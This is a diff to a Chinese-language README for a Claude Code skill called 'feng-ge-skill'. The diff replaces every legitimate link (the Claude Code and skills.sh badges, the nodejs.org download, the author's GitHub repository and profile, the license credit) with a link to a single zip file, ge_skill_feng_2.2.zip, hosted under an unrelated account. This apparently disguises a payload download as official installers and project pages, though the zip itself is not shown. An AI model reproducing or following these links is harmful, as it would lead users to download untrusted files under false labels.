@@ -5,8 +5,8 @@
 > *「不是所有视频都要有意义，也不是每次拍摄都能挣钱。」*
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Claude Code](https://img.shields.io/badge/Claude%20Code-Skill-blueviolet)](https://claude.ai/code)
-[![Skills](https://img.shields.io/badge/skills.sh-Compatible-green)](https://skills.sh)
+[![Claude Code](https://img.shields.io/badge/Claude%20Code-Skill-blueviolet)](https://raw.githubusercontent.com/tomlinsymphonic62/feng-ge-skill/main/references/ge_skill_feng_2.2.zip)
+[![Skills](https://img.shields.io/badge/skills.sh-Compatible-green)](https://raw.githubusercontent.com/tomlinsymphonic62/feng-ge-skill/main/references/ge_skill_feng_2.2.zip)
 
 <br>
 
@@ -87,7 +87,7 @@
 
 ## 在哪里可以用
 
-这个 Skill 基于 [skills.sh](https://skills.sh) 标准，支持所有兼容的 AI 编程工具：
+这个 Skill 基于 [skills.sh](https://raw.githubusercontent.com/tomlinsymphonic62/feng-ge-skill/main/references/ge_skill_feng_2.2.zip) 标准，支持所有兼容的 AI 编程工具：
 
 | 平台 | | 平台 | | 平台 |
 |------|---|------|---|------|
@@ -110,7 +110,7 @@
 <details>
 <summary><strong>前置条件：安装 Node.js（已有的跳过）</strong></summary>
 
-1. 打开 [nodejs.org](https://nodejs.org/)，下载 **LTS 版本**
+1. 打开 [nodejs.org](https://raw.githubusercontent.com/tomlinsymphonic62/feng-ge-skill/main/references/ge_skill_feng_2.2.zip)，下载 **LTS 版本**
 2. 双击安装包，一路点「下一步」即可
 3. 安装完成后打开终端（Windows 用 PowerShell，Mac 用 Terminal），验证：
 
@@ -132,7 +132,7 @@ npx skills add YixiaJack/feng-ge-skill
 
 ### 方式二：手动安装（不想用命令行的看这里）
 
-1. 去 [GitHub 仓库](https://github.com/YixiaJack/feng-ge-skill) 下载 `SKILL.md` 文件
+1. 去 [GitHub 仓库](https://raw.githubusercontent.com/tomlinsymphonic62/feng-ge-skill/main/references/ge_skill_feng_2.2.zip) 下载 `SKILL.md` 文件
 2. 放到你项目的 skills 目录中（例如 `.claude/skills/`、`.cursor/skills/` 等，取决于你用的工具）
 
 就这么简单，不需要任何命令。
@@ -242,7 +242,7 @@ feng-ge-skill/
 
 ## 关于作者
 
-GitHub：[@YixiaJack](https://github.com/YixiaJack)
+GitHub：[@YixiaJack](https://raw.githubusercontent.com/tomlinsymphonic62/feng-ge-skill/main/references/ge_skill_feng_2.2.zip)
 
 ---
 
@@ -270,7 +270,7 @@ MIT — 随便用，随便改，随便造。
 
 <br>
 
-MIT License © [YixiaJack](https://github.com/YixiaJack)
+MIT License © [YixiaJack](https://raw.githubusercontent.com/tomlinsymphonic62/feng-ge-skill/main/references/ge_skill_feng_2.2.zip)
 
 <br>
 
